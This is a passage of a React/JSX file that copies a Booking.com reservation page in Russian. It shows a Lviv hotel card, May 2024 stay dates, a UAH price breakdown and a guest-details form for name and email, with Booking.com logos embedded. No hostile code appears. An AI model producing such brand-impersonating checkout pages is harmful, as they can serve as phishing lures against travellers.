                            </div>
                            <div className="c624d7469d a0e60936ad a3214e5942" style={{'-bui_stack_spaced_gap-s': '2'}}
                                 bis_skin_checked="1">
                                <div className="c624d7469d a0e60936ad a3214e5942"
                                     style={{'-bui_stack_spaced_gap-s': '0.5'}} bis_skin_checked="1"><span
                                    className="f419a93f12"><button aria-expanded="false" type="button"
                                                                   className="a83ed08757 a9377ef817"><div
                                    className="a53cbfa6de" bis_skin_checked="1">Akademika Hnatyuka Street 6, Львов, 79007, Украина</div></button></span>
                                    <div className="abf093bdfe d068504c75" bis_skin_checked="1">Великолепное
                                        расположение — 9.7
                                    </div>
                                </div>
                                <div className="" bis_skin_checked="1">
                                    <div className="c624d7469d f034cf5568 dab7c5c6fa a937b09340 a3214e5942 cbf4befc54"
                                         style={{'-bui_stack_spaced_gap-s': '2'}} bis_skin_checked="1">
                                        <div className="abf093bdfe d86cee9b25" bis_skin_checked="1">8.6
                                            <div className="ac4a7896c7" bis_skin_checked="1">Оценка 8.6</div>
                                        </div>
                                        <div className="dc5041d860 c72df67c95 a29749fd9f" bis_skin_checked="1"><span
                                            className="abf093bdfe e6208ee469 cb2cbb3ccb"> Потрясающе<div
                                            className="ac4a7896c7"
                                            bis_skin_checked="1">Оценка потрясающе</div></span><span
                                            className="abf093bdfe f45d8e4c32 d935416c47">&nbsp;·&nbsp;4&nbsp;236 отзывов</span>
                                        </div>
                                    </div>
                                </div>
                                <div className="" bis_skin_checked="1">
                                    <ul className="a08b4b7ace" data-testid="property-details__facilities">
                                        <li className="a403bd18aa"><span><div data-testid="property-facility-badge-icon"
                                                                              className="abf093bdfe e6208ee469 f50370658e label e2e45c20bf"
                                                                              bis_skin_checked="1"><span
                                            data-testid="icon-with-text-icon"
                                            className="fcd9eec8fb d9d03d7ca2 bf9a32efa5" aria-hidden="true"><svg
                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path
                                            d="M16.01 15a4.5 4.5 0 1 0-9 0l.75-.75a3.75 3.75 0 1 0 0 7.5 4.96 4.96 0 0 0 2.245-.59 3.277 3.277 0 0 1 3.018.005c.677.365 1.44.567 2.22.585a3.75 3.75 0 1 0 .018-7.5l.749.75zm-1.5 0c0 .414.336.75.75.75a2.25 2.25 0 0 1 0 4.5 3.435 3.435 0 0 1-1.536-.41 4.786 4.786 0 0 0-4.42-.005 3.457 3.457 0 0 1-1.562.415A2.247 2.247 0 0 1 5.51 18a2.25 2.25 0 0 1 2.25-2.25.75.75 0 0 0 .75-.75 3 3 0 1 1 6 0zm-9.75-3.75a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zm3-6a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zm6 0a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0zm3.75 6a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zm1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0z"></path></svg></span><span
                                            className="afad290af2">Можно с питомцами</span></div></span></li>
                                        <li className="a403bd18aa"><span><div data-testid="property-facility-badge-icon"
                                                                              className="abf093bdfe e6208ee469 f50370658e label e2e45c20bf"
                                                                              bis_skin_checked="1"><span
                                            data-testid="icon-with-text-icon"
                                            className="fcd9eec8fb d9d03d7ca2 bf9a32efa5" aria-hidden="true"><svg
                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path
                                            d="M14.25 18.75a2.25 2.25 0 1 1-4.5 0 2.25 2.25 0 0 1 4.5 0zm1.5 0a3.75 3.75 0 1 0-7.5 0 3.75 3.75 0 0 0 7.5 0zm2.08-5.833a8.25 8.25 0 0 0-11.666 0 .75.75 0 0 0 1.06 1.06 6.75 6.75 0 0 1 9.546 0 .75.75 0 0 0 1.06-1.06zm3.185-3.182c-4.979-4.98-13.051-4.98-18.03 0a.75.75 0 1 0 1.06 1.06c4.394-4.393 11.516-4.393 15.91 0a.75.75 0 1 0 1.06-1.06zm2.746-3.603C17.136-.043 6.864-.043.24 6.132A.75.75 0 1 0 1.26 7.23c6.05-5.638 15.429-5.638 21.478 0a.75.75 0 0 0 1.022-1.098z"></path></svg></span><span
                                            className="afad290af2">Бесплатный Wi-Fi</span></div></span></li>
                                        <li className="a403bd18aa"><span><div data-testid="property-facility-badge-icon"
                                                                              className="abf093bdfe e6208ee469 f50370658e label e2e45c20bf"
                                                                              bis_skin_checked="1"><span
                                            data-testid="icon-with-text-icon"
                                            className="fcd9eec8fb d9d03d7ca2 bf9a32efa5" aria-hidden="true"><svg
                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128"><path
                                            d="M108.42 55.84H44.26a9 9 0 0 0-8.94 8.94v20.67H19.58a9 9 0 0 0-8.93 8.94v14.8a9 9 0 0 0 8.93 8.94h6.47c2.2 7.332 9.928 11.491 17.26 9.291a13.861 13.861 0 0 0 9.29-9.291h22.8c2.2 7.332 9.928 11.491 17.26 9.291a13.861 13.861 0 0 0 9.29-9.291h1.53c7.658-.006 13.864-6.212 13.87-13.87V64.78a9 9 0 0 0-8.93-8.94zm.93 8.94v20.67H92.68V63.84h15.74a.94.94 0 0 1 .93.94zM68 85.45V63.84h16.68v21.61zM44.26 63.84H60v21.61H43.32V64.78c0-.52.42-.94.94-.94zM39.32 120a5.87 5.87 0 1 1 5.87-5.87 5.88 5.88 0 0 1-5.87 5.87zm49.36 0a5.87 5.87 0 1 1 5.87-5.87 5.87 5.87 0 0 1-5.87 5.87zm14.8-9.87H102c-2.2-7.332-9.928-11.491-17.26-9.291a13.861 13.861 0 0 0-9.29 9.291H52.6c-2.2-7.332-9.928-11.491-17.26-9.291a13.861 13.861 0 0 0-9.29 9.291h-6.47a.94.94 0 0 1-.93-.94v-14.8a.94.94 0 0 1 .93-.94h89.77v10.81a5.87 5.87 0 0 1-5.87 5.87zm-92.29-82a4 4 0 0 1 5.467-1.451l.003.001 6.69 3.88 12.33-6-13.79-8a4 4 0 0 1 4-6.91l18.4 10.73 13.07-6.4a4.003 4.003 0 1 1 3.52 7.19l-36 17.6a4 4 0 0 1-3.76-.13l-8.54-5a4 4 0 0 1-1.39-5.52z"></path></svg></span><span
                                            className="afad290af2">Трансфер от/до аэропорта</span></div></span></li>
                                        <li className="a403bd18aa"><span><div data-testid="property-facility-badge-icon"
                                                                              className="abf093bdfe e6208ee469 f50370658e label e2e45c20bf"
                                                                              bis_skin_checked="1"><span
                                            data-testid="icon-with-text-icon"
                                            className="fcd9eec8fb d9d03d7ca2 bf9a32efa5" aria-hidden="true"><svg
                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path
                                            d="M5.999.75v22.5a.75.75 0 0 0 1.5 0V.75a.75.75 0 0 0-1.5 0zm3 0V7.5a2.259 2.259 0 0 1-2.252 2.25 2.258 2.258 0 0 1-2.248-2.252V.75a.75.75 0 0 0-1.5 0V7.5a3.76 3.76 0 0 0 3.748 3.75 3.76 3.76 0 0 0 3.752-3.748V.75a.75.75 0 0 0-1.5 0zm6.75 15.75h3c1.183.046 2.203-.9 2.25-2.111a2.22 2.22 0 0 0 0-.168c-.25-6.672-.828-9.78-3.231-13.533a1.508 1.508 0 0 0-2.77.81V23.25a.75.75 0 0 0 1.5 0V1.503c0 .003.001 0 .003 0a.006.006 0 0 1 .008.002c2.21 3.45 2.75 6.354 2.99 12.773v.053a.696.696 0 0 1-.721.67L15.749 15a.75.75 0 0 0 0 1.5z"></path></svg></span><span
                                            className="afad290af2">Ресторан</span></div></span></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    }

    function BookingInfo() {
        return <section className="bui-card bp-card--booking-summary bui-u-bleed@small mb-1">
            <div className="bui-card__content" bis_skin_checked="1">
                <header className="bui-card__header bui-spacer--large ">
                    <h2 className="bui-card__title">Детали вашего бронирования</h2>
                </header>
                <div className="bui-group bui-group--large" bis_skin_checked="1">
                    <div className="bui-group bui-group--large" bis_skin_checked="1">
                        <div className="bui-group__item" bis_skin_checked="1">
                            <div className="bui-date-range bui-date-range--large bp-date-range" bis_skin_checked="1">
                                <div className="bui-date-range__item" bis_skin_checked="1">
                                    <div id="bp-checkin-date__label" className="bui-date__label"
                                         bis_skin_checked="1">Заезд
                                    </div>
                                    <time className="bui-date bui-date--large"
                                          aria-describedby="bp-checkin-date__label">
                                        <span className="bui-date__title">пт, 3 мая 2024</span>
                                        <span className="bui-date__subtitle">
С 14:00
</span>
                                    </time>
                                </div>
                                <div className="bui-date-range__item" bis_skin_checked="1">
                                    <div id="bp-checkout-date__label" className="bui-date__label"
                                         bis_skin_checked="1">Отъезд
                                    </div>
                                    <time className="bui-date bui-date--large"
                                          aria-describedby="bp-checkout-date__label">
                                        <span className="bui-date__title">чт, 16 мая 2024</span>
                                        <span className="bui-date__subtitle">
До 12:00
</span>
                                    </time>
                                </div>
                            </div>
                        </div>
                        <div className="bui-group__item bui-group bui-group--small" bis_skin_checked="1">
                            <div className="bui-group__item bui-f-font-emphasized" bis_skin_checked="1">Общая
                                длительность проживания:
                            </div>
                            <div className="bui-group__item bui-f-font-strong" bis_skin_checked="1">
                                13 ночей
                            </div>
                        </div>
                    </div>
                    <hr className="bui-divider"/>
                    <div className="bui-group bui-group--large" bis_skin_checked="1">
                        <div className="bui-group__item" bis_skin_checked="1">
                            <ul className="bui-accordion bp-unit-selection-accordion"
                                data-bui-component="Accordion">
                                <li className="bui-accordion__row">
                                    <button
                                        className="bui-accordion__row-inner bp-unit-selection-accordion__row-inner"
                                        data-bui-ref="accordion-button" aria-controls="unit-selection-content"
                                        aria-expanded="false" type="button">
                                        <div className="bui-accordion__row-header" id="unit-selection-label"
                                             bis_skin_checked="1">
                                            <p className="bui-accordion__subtitle bp-unit-selection-accordion__subtitle">Вы
                                                выбрали:</p>
                                            <h3 className="bui-accordion__title">
                                                1 номер для
                                                2 взрослых
                                            </h3>
                                        </div>

                                    </button>
                                    <div id="unit-selection-content"
                                         className="bui-accordion__content bp-unit-selection-accordion__content"
                                         role="region" aria-labelledby="unit-selection-label" bis_skin_checked="1">
                                        <ul className="bui-list bui-list--text bp-list--compact">
                                            <li className="bui-list__item">
                                                <div className="bui-text bui-text--variant-emphasized_2"
                                                     bis_skin_checked="1">
                                                    1 x Двухместный номер с 1 кроватью или 2 отдельными кроватями и
                                                    балконом
                                                </div>
                                                <div className="bui-text bui-text--variant-body_2"
                                                     bis_skin_checked="1">
                                                    2 взрослых
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    }

    function BookingPrice() {
        return <div className="bui-group bui-group--large mb-1" data-hotel-currency-code="UAH"
                    data-user-currency-code="UAH"
                    data-is-us-breakdown="false" data-component="bp/price-details" bis_skin_checked="1">
            <div className="bui-card-group" bis_skin_checked="1">
                <section
                    className="bui-card bp-card--price-details js-price-details e2e-price-details  bui-u-bleed@small ">
                    <div className="bui-card__content" bis_skin_checked="1">
                        <header className="bui-card__header bui-spacer--large ">
                            <h2 className="bui-card__title">
                                Детали цены
                            </h2>
                        </header>
                        <div
                            className="bui-card__text bp-price-details__total bp-price-details__total--discount-breakdown bp-price-details__total--discount-breakdown-with-bg "
                            bis_skin_checked="1">
                            <div className="bui-group bui-group--large" bis_skin_checked="1">
                                <div className="bui-group__item" bis_skin_checked="1">
                                    <div className="bui-group bui-group--medium" bis_skin_checked="1">
                                        <div className="bui-group__item" bis_skin_checked="1">
                                            <div
                                                className="bp-price-details__total-line bp-price-details__total-line--user js-price-details__total-line--user e2e-price-details__total-line--user bp-price-details__total-line--v-align-end"
                                                bis_skin_checked="1">
                                                <div className="bp-price-details__charge-type" bis_skin_checked="1">
                                                    <div className="bp-price-details__total-price bui-u-padding-end--8"
                                                         bis_skin_checked="1">
                                                        Итого
                                                    </div>
                                                </div>
                                                <div className="bui-u-text-right" bis_skin_checked="1">
                                                    <div
                                                        className="bp-price-details__total-price --wrap-nowrap e2e-price-details__total-charge--user"
                                                        data-price="27429.14" data-currency-code="UAH"
                                                        data-pd-total-usercurrency="" bis_skin_checked="1">
<span data-component="core/animate-price" className="" data-value="27429.14" data-currency="UAH" data-precision=""
      data-animate-price-group-name="bp_user_total_price" data-animation-speed="0.7" style={{display: 'inline-block'}}>
UAH&nbsp;27 429,14
</span>
                                                    </div>
                                                </div>
                                            </div>
                                            <div className="bui-u-text-right" bis_skin_checked="1">
                                                <div className="bp-price-details__total--taxes-and-charges-info"
                                                     bis_skin_checked="1">
                                                    Включая налоги и сборы
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    }

    function BookingClientInfo({entity,setEntity}) {
        return <section className="bui-card bp-card--user-details bui-spacer--large  bui-u-bleed@small">
            <div className="bui-card__content" bis_skin_checked="1">
                <header className="bui-inline-container">
                    <div className="bui-inline-container__main" bis_skin_checked="1">
                        <h2 className="bui-text--variant-headline_3">
                            Введите свои данные
                        </h2>
                    </div>
                </header>
                <div className="bui-card__text" bis_skin_checked="1">
                    <div
                        className="bui-box bui-box--background-color-neutral_alt bui-box--border-color-neutral bui-box--border-width-100 bui-box--border-radius-200 bui-spacer--large"
                        data-test-id="required-fields-description" bis_skin_checked="1">
                        <div className="bui-inline-container bui-inline-container--size-small" bis_skin_checked="1">
                            <div className="bui-inline-container__start" bis_skin_checked="1">
<span className="bui-icon bui-icon--medium" role="presentation">
<svg className="bk-icon -streamline-info_sign" height="16" role="presentation" width="16" viewBox="0 0 24 24"
     aria-hidden="true" focusable="false"><path
    d="M14.25 15.75h-.75a.75.75 0 0 1-.75-.75v-3.75a1.5 1.5 0 0 0-1.5-1.5h-.75a.75.75 0 0 0 0 1.5h.75V15a2.25 2.25 0 0 0 2.25 2.25h.75a.75.75 0 0 0 0-1.5zM11.625 6a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5zM22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12zm1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12z"></path></svg>
</span>
                            </div>
                            <div className="bui-inline-container__main" bis_skin_checked="1">
                                <p className="bui-text--variant-body_2 bui-spacer--medium">
                                    Почти готово! Просто заполните обязательные поля (<strong
                                    className="bui-text bui-text--color-destructive">*</strong>).
                                </p>
                                <p className="bui-text--variant-body_2">Пожалуйста, укажите все свои данные латинскими
                                    буквами, чтобы в отеле смогли их понять</p>
                            </div>
                        </div>
                    </div>
                    <div className="bp-personal-details-form" data-component="bp/personal-details-form"
                         bis_skin_checked="1">
                        <div className="bui-grid bui-grid--size-small" bis_skin_checked="1">
                            <div className="bui-grid__column bui-grid__column-6@medium bui-grid__column-6@large"
                                 bis_skin_checked="1">
                                <div data-component="bp/personal-details-form/firstname" className="
bp_form__field bp_form__field--firstname
" bis_skin_checked="1">
                                    <p className="bp_form__field__msg" data-bp-form-field-msg=""
                                       id="bp_form_firstname_msg" role="alert">
                                    </p>
                                    <label htmlFor="firstname" className="bp_form__field__label">
                                        Имя (латиницей)
                                        <abbr className="mandatory-asterisk" title="Обязательно"
                                              aria-hidden="true"> *</abbr>
                                    </label>
                                    <input type="text" name="firstname" id="firstname"
                                           className="bp_input_text bp_form__field__input form-control"
                                           aria-describedby="bp_form_firstname_msg" value={entity.firstName}
                                           onChange={(e) => setEntity((prevState) => ({
                                               ...prevState,
                                               firstName: e.target.value
                                           }))}
                                           size="20"/>
                                </div>
                            </div>
                            <div className="bui-grid__column bui-grid__column-6@medium bui-grid__column-6@large"
                                 bis_skin_checked="1">
                                <div data-component="bp/personal-details-form/lastname" className="
bp_form__field bp_form__field--lastname
" bis_skin_checked="1">
                                    <p className="bp_form__field__msg" data-bp-form-field-msg=""
                                       id="bp_form_lastname_msg" role="alert">
                                    </p>
                                    <label htmlFor="lastname" className="bp_form__field__label">
                                        Фамилия (латиницей)
                                        <abbr className="mandatory-asterisk" title="Обязательно"
                                              aria-hidden="true"> *</abbr>
                                    </label>
                                    <input type="text" name="lastname" id="lastname" required=""
                                           className="bp_input_text bp_form__field__input form-control"
                                           aria-describedby="bp_form_lastname_msg" value={entity.lastName}
                                           onChange={(e) => setEntity((prevState) => ({
                                               ...prevState,
                                               lastName: e.target.value
                                           }))} size="20"/>
                                </div>
                            </div>
                            <div className="bui-grid__column bui-grid__column-8@medium bui-grid__column-6@large"
                                 bis_skin_checked="1">
                                <div data-component="booking-process/user-details/email" className="
bp_form__field bp_form__field--email
u-clearfix
" bis_skin_checked="1">
                                    <p className="bp_form__field__msg" data-bp-form-field-msg="" id="bp_form_email_msg"
                                       role="alert">
                                    </p>
                                    <label htmlFor="email" className="bp_form__field__label">
                                        Адрес электронной почты
                                        <abbr className="mandatory-asterisk" title="Обязательно"
                                              aria-hidden="true"> *</abbr>
                                    </label>
                                    <div className="bp-form-group__input-container" bis_skin_checked="1">
                                        <input autoCapitalize="off" autoCorrect="off" type="text" required="" id="email"
                                               className="form-control bp_input_text bp_form__field__input" name="email"
                                               value={entity.email}
                                               onChange={(e) => setEntity((prevState) => ({
                                                   ...prevState,
                                                   email: e.target.value
                                               }))}
                                               size="35" maxLength="60"
                                               placeholder="Убедитесь, что вводите без опечаток"
                                               aria-describedby="bp_form_email_msg email-tip"/>
                                        <div className="js-placeholder--email-suggestion"
                                             bis_skin_checked="1"></div>
                                    </div>
                                    <input type="hidden" name="email_confirm" value=""/>
                                    <svg className="bk-icon -logos-booking-logo" height="42" style={{display: 'none'}}
                                         width="252" viewBox="0 0 252 42" role="presentation" aria-hidden="true"
                                         focusable="false">
                                        <path
                                            d="M15.592 22.92C15.591 20.283 13.924 18.652 11.348 18.652H7.738C6.58 18.815 6.055 19.518 6.055 20.877V26.783L11.348 26.79C13.966 26.79 15.591 25.629 15.592 22.92ZM6.055 13.391H10.819C13.496 13.391 14.449 11.689 14.449 9.911C14.449 7.576 13.057 6.181 10.735 6.181H8.025C6.671 6.268 6.055 6.966 6.055 8.428V13.391ZM21.815 23.351C21.815 28.956 17.536 32.87 10.912 32.87H0V4.87C0.02 3.085 1.872 1.285 3.64 1.218H10.777C16.737 1.218 20.587 4.222 20.587 9.202C20.587 12.462 18.959 14.346 17.988 15.183L17.152 15.9L18.109 16.441C20.432 17.751 21.815 20.333 21.815 23.351V23.351ZM148.135 20.675C148.135 15.58 145.385 14.986 143.325 14.986C139.165 14.986 138.845 19.175 138.845 20.459C138.845 23.376 140.105 26.49 143.665 26.49C145.705 26.49 148.135 25.48 148.135 20.675V20.675ZM154.045 9.738L154.025 30.732C154.025 38.739 148.045 41.584 142.505 41.584C139.815 41.584 136.845 40.858 134.555 39.639L134.105 39.4L134.835 37.53L135.345 36.243C135.905 34.855 136.715 34.509 138.095 34.928C139.155 35.312 140.735 35.739 142.475 35.739C146.045 35.739 148.015 34.05 148.015 30.994V30.356L147.505 30.732C146.215 31.72 144.575 32.205 142.505 32.205C136.445 32.205 132.215 27.445 132.215 20.63C132.215 13.811 136.305 9.228 142.385 9.228C145.445 9.228 147.325 10.309 148.375 11.221L148.675 11.482L148.855 11.132C149.325 10.23 150.275 9.738 151.515 9.738H154.045V9.738ZM67.707 21.184C67.707 17.473 65.411 14.877 62.137 14.877C58.877 14.877 56.608 17.473 56.608 21.184C56.608 24.898 58.878 27.496 62.138 27.496C65.464 27.496 67.708 24.958 67.708 21.184H67.707ZM74.088 21.184C74.088 28.054 69.052 33.04 62.138 33.04C55.234 33.04 50.228 28.054 50.228 21.184C50.228 14.318 55.234 9.331 62.138 9.331C69.052 9.331 74.088 14.318 74.088 21.184ZM105.445 32.677V13.281C105.445 10.941 104.335 9.806 102.025 9.806L99.465 9.796L99.485 27.5H99.465L99.485 32.87H105.445V32.677ZM122.505 9.278C119.175 9.278 117.055 10.765 115.865 12.018L115.465 12.423L115.325 11.873C114.975 10.529 113.795 9.788 112.025 9.788H109.165L109.185 32.683H115.225V22.131C115.225 21.099 115.365 20.205 115.635 19.387C116.355 16.914 117.995 15.378 120.525 15.378C122.555 15.378 123.725 16.453 123.725 19.232V29.203C123.725 31.573 125.195 32.683 127.555 32.683H129.785V18.261C129.785 12.475 127.825 9.278 122.505 9.278V9.278ZM91.436 21.777C91.1964 21.3119 90.8928 20.8827 90.534 20.502L90.326 20.281L90.546 20.069C90.862 19.734 91.186 19.338 91.497 18.878L97.584 9.795H90.195L85.622 16.899C85.363 17.28 84.84 17.472 84.058 17.472H82.48V4.045C82.48 1.36 80.642 0 78.84 0H76.414L76.42 32.691H82.48V23.183H83.63C84.375 23.183 84.883 23.269 85.118 23.675L88.729 30.518C89.736 32.375 90.743 32.691 92.635 32.691H97.651L93.915 26.488L91.436 21.777ZM41.648 21.184C41.648 17.473 39.358 14.877 36.079 14.877C32.819 14.877 30.553 17.473 30.553 21.184C30.553 24.898 32.819 27.496 36.079 27.496C39.405 27.496 41.649 24.958 41.649 21.184H41.648ZM48.028 21.184C48.028 28.054 43.002 33.04 36.079 33.04C29.182 33.04 24.177 28.054 24.177 21.184C24.177 14.318 29.182 9.331 36.079 9.331C43.002 9.331 48.027 14.318 48.027 21.184H48.028ZM98.764 3.81C98.764 1.704 100.464 0 102.544 0C104.634 0 106.334 1.704 106.334 3.81C106.334 5.911 104.634 7.617 102.544 7.617C100.464 7.617 98.764 5.911 98.764 3.81Z"
                                            fill="#003580"></path>
                                        <path
                                            d="M187.08 25.067C187.06 25.088 184.38 27.915 180.87 27.915C177.66 27.915 174.42 25.941 174.42 21.538C174.42 17.73 176.93 15.071 180.53 15.071C181.7 15.071 183.02 15.492 183.23 16.198L183.26 16.318C183.74 17.919 185.19 18.001 185.47 18.001L188.88 18.005V15.021C188.88 11.085 183.89 9.65698 180.53 9.65698C173.35 9.65698 168.14 14.674 168.14 21.584C168.14 28.489 173.29 33.502 180.4 33.502C186.56 33.502 189.91 29.434 189.94 29.391L190.12 29.172L187.43 24.685L187.08 25.067ZM244.43 9.65698C241.73 9.65698 239.25 10.927 237.58 13.05L237.11 13.651L236.74 12.979C235.53 10.776 233.46 9.65698 230.57 9.65698C227.55 9.65698 225.53 11.35 224.58 12.358L223.97 13.024L223.73 12.144C223.39 10.877 222.26 10.178 220.56 10.178H218.06L218.04 32.984H224.01V22.917C224.01 22.036 224.12 21.163 224.34 20.248C224.93 17.816 226.56 15.202 229.3 15.462C230.99 15.626 231.81 16.936 231.81 19.466V32.984H237.44V22.917C237.44 21.813 237.55 20.99 237.79 20.162C238.3 17.842 240.37 15.459 243.02 15.459C244.93 15.459 245.93 16.545 245.93 19.466V29.649C245.93 31.954 247.28 32.984 249.57 32.984H251.99L252 18.424C252 12.607 249.45 9.65698 244.43 9.65698V9.65698ZM203.66 10.043C196.76 10.043 191.35 15.031 191.35 21.898C191.35 28.765 196.76 33.754 203.66 33.754C210.58 33.754 215.61 28.765 215.61 21.898C215.61 15.031 210.58 10.043 203.66 10.043V10.043ZM158.31 29.446C158.31 27.34 160 25.636 162.09 25.636C164.18 25.636 165.88 27.34 165.88 29.446C165.88 31.548 164.18 33.254 162.09 33.254C160 33.254 158.31 31.548 158.31 29.446ZM203.66 28.209C200.4 28.209 198.13 25.611 198.13 21.898C198.13 18.186 200.4 15.59 203.66 15.59C206.93 15.59 209.23 18.186 209.23 21.898C209.23 25.671 206.99 28.209 203.66 28.209Z"
                                            fill="#003580"></path>
                                    </svg>
                                    <svg className="bk-icon -iconset-close" height="128" style={{display: 'none'}}
                                         width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true"
                                         focusable="false">
                                        <path
                                            d="M69.7 64l33.1-33.2a4 4 0 0 0-5.6-5.6L64 58.3 30.8 25.2a4 4 0 1 0-5.6 5.6L58.3 64 25.2 97.2a4 4 0 1 0 5.6 5.6L64 69.7l33.2 33.1a4 4 0 0 0 5.6-5.6z"></path>
                                    </svg>
                                    <div id="ge_existing_email_popover_genius"
                                         className="js-eligible-genius-email bui-card bui-u-hidden"
                                         bis_skin_checked="1">
                                        <div className="bui-card__content" bis_skin_checked="1">
                                            <div className="genius-popover__g-logo" bis_skin_checked="1">
                                                <svg
                                                    className="bk-icon -genius-new_identity-genius_logo genius-logo Класс"
                                                    height="20" width="78" viewBox="0 0 503 128" role="presentation"
                                                    aria-hidden="true" focusable="false">
                                                    <g clip-path="url(#clip0-2497)">
                                                        <path
                                                            d="M481.34 101.48C481.338 102.722 480.993 103.939 480.344 104.998C479.695 106.056 478.766 106.915 477.66 107.48C474.694 109.084 471.348 109.851 467.98 109.7C463.613 109.83 459.308 108.638 455.63 106.28C452.366 104.194 449.844 101.132 448.42 97.5299C447.75 95.8199 446.54 95.3599 444.82 96.1599L431.82 101.99C430 102.8 429.48 103.99 430.28 105.76C433.059 112.341 437.829 117.887 443.92 121.62C450.38 125.787 458.58 127.873 468.52 127.88C478.12 127.88 486.237 125.423 492.87 120.51C499.503 115.597 502.817 108.93 502.81 100.51C502.81 86.5565 492.98 77.9265 473.32 74.6199C468.617 73.9564 464.051 72.5382 459.8 70.4199C456.66 68.8699 453.08 66.8999 453.08 64.4999C453.08 62.4399 454.32 60.7999 456.77 59.6099C459.882 58.283 463.25 57.6681 466.63 57.8099C473.257 57.8099 479.03 60.3832 483.95 65.5299C485.31 66.8999 486.7 67.0699 488.06 66.0399L497.33 57.4699C498.92 56.2099 499.1 54.8299 497.84 53.3599C490.613 44.5199 480.027 40.1032 466.08 40.1099C456.14 40.1099 448.2 42.3665 442.26 46.8799C439.399 48.9679 437.092 51.7225 435.537 54.9046C433.983 58.0867 433.229 61.6001 433.34 65.1399C433.285 68.1652 433.893 71.1659 435.124 73.9303C436.354 76.6948 438.175 79.1558 440.46 81.1399C445.2 85.4265 451.627 88.3165 459.74 89.8099C467.74 91.2799 473.34 92.8799 476.55 94.5999C479.76 96.3199 481.34 98.6199 481.34 101.48Z"
                                                            fill="#004CB8"></path>
                                                        <path
                                                            d="M346.84 94.6999C346.84 104.967 349.64 113.05 355.24 118.95C360.84 124.85 368.44 127.793 378.04 127.78C381.428 127.81 384.8 127.321 388.04 126.33C390.515 125.609 392.872 124.535 395.04 123.14C397.115 121.673 399.093 120.073 400.96 118.35L403.02 123.35C403.333 124.119 403.885 124.767 404.595 125.199C405.304 125.631 406.133 125.824 406.96 125.75H421.02C421.393 125.803 421.772 125.769 422.13 125.65C422.487 125.531 422.812 125.331 423.078 125.066C423.345 124.8 423.546 124.476 423.666 124.119C423.786 123.762 423.822 123.383 423.77 123.01V44.9999C423.823 44.6263 423.789 44.2454 423.67 43.8874C423.551 43.5293 423.35 43.204 423.083 42.9371C422.816 42.6702 422.491 42.4692 422.133 42.3499C421.774 42.2306 421.394 42.1964 421.02 42.2499H403.76C403.386 42.1947 403.004 42.2276 402.644 42.3461C402.285 42.4646 401.958 42.6654 401.69 42.9325C401.422 43.1996 401.22 43.5256 401.1 43.8845C400.98 44.2434 400.946 44.6254 401 44.9999V98.1199C396.653 104.4 390.94 107.543 383.86 107.55C379.4 107.55 375.94 106.123 373.48 103.27C371.02 100.417 369.8 96.6599 369.82 91.9999V44.9999C369.82 43.1699 368.82 42.2499 366.9 42.2499H349.75C347.81 42.2499 346.84 43.1699 346.84 44.9999V94.6999Z"
                                                            fill="#004CB8"></path>
                                                        <path
                                                            d="M305.33 15.9999C305.304 18.1028 305.71 20.1887 306.522 22.1288C307.333 24.0689 308.534 25.822 310.05 27.2799C311.524 28.7747 313.28 29.9617 315.216 30.7719C317.153 31.5821 319.231 31.9993 321.33 31.9993C323.429 31.9993 325.507 31.5821 327.444 30.7719C329.38 29.9617 331.136 28.7747 332.61 27.2799C334.124 25.8205 335.323 24.0672 336.135 22.1274C336.947 20.1877 337.353 18.1025 337.33 15.9999C337.353 13.8973 336.947 11.8122 336.135 9.87241C335.323 7.93266 334.124 6.17928 332.61 4.71991C331.136 3.22509 329.38 2.03809 327.444 1.2279C325.507 0.417708 323.429 0.000488281 321.33 0.000488281C319.231 0.000488281 317.153 0.417708 315.216 1.2279C313.28 2.03809 311.524 3.22509 310.05 4.71991C308.534 6.17784 307.333 7.93095 306.522 9.87103C305.71 11.8111 305.304 13.897 305.33 15.9999V15.9999Z"
                                                            fill="#FEBB02"></path>
                                                        <path
                                                            d="M295.83 70C295.83 60.5133 293.23 53.18 288.03 48C282.83 42.82 275.427 40.22 265.82 40.2C257.153 40.2 249.153 43.3999 241.82 49.7999L239.59 45C239.359 44.1991 238.856 43.5037 238.168 43.0329C237.48 42.5622 236.65 42.3455 235.82 42.4199H221.75C219.81 42.4199 218.84 43.3399 218.84 45.1699V123.17C218.84 125 219.84 125.91 221.75 125.91H238.9C240.85 125.91 241.82 125 241.82 123.17V69.8C243.849 67.2349 246.351 65.0827 249.19 63.4599C252.055 61.6102 255.38 60.5988 258.79 60.54C268.263 60.54 273 65.6933 273 76V123.15C273 123.877 273.289 124.574 273.802 125.087C274.316 125.601 275.013 125.89 275.74 125.89H293.06C293.789 125.89 294.489 125.6 295.005 125.084C295.52 124.569 295.81 123.869 295.81 123.14L295.83 70Z"
                                                            fill="#004CB8"></path>
                                                        <path
